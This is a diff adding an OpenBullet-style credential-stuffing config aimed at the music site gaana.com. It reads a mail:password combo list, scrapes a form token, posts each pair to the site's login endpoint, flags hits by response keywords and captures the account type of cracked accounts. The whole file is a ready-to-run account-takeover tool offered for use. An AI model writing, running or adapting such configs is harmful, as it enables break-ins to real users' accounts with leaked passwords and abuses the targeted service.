@@ -1,0 +1,65 @@
+[SETTINGS]
+{
+  "Name": "gaana.com",
+  "SuggestedBots": 10,
+  "LastModified": "2018-09-30T17:11:17.5786408+00:00",
+  "AdditionalInfo": "",
+  "Author": "meinname",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [
+    {
+      "SliceName": "USER",
+      "RuleType": 2,
+      "RuleString": "1",
+      "Id": 269252094
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 2,
+      "RuleString": "1",
+      "Id": 1293158015
+    }
+  ],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET REQUEST GET "https://gaana.com" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#formClientId PARSE "<SOURCE>" LR "formClientId=\"" "\";var" Recursive=FALSE -> VAR "FORMCLIENTID" "" "" 
+#POST REQUEST POST "https://gaana.com/ajax/get_ajax_content" AutoRedirect=TRUE 
+  CONTENT "action=get_form_client&formClientId=<FORMCLIENTID>" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#formClient PARSE "<SOURCE>" JSON "formClient" Recursive=FALSE -> VAR "FORMCLIENT" "" "" 
+#Login REQUEST POST "https://gaana.com/ajax/login" AutoRedirect=TRUE 
+  CONTENT "username=<USER>&password=<PASS>&verificationStatus=1&task=login&formClientId=<FORMCLIENT>" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Wrong user name or password" 
+    KEY "Please Enter user name or password" 
+  KEYCHAIN Success OR 
+    KEY "success" 
+#Account_Type PARSE "<SOURCE>" JSON "account" Recursive=FALSE -> CAP "AccountType" "" "" 
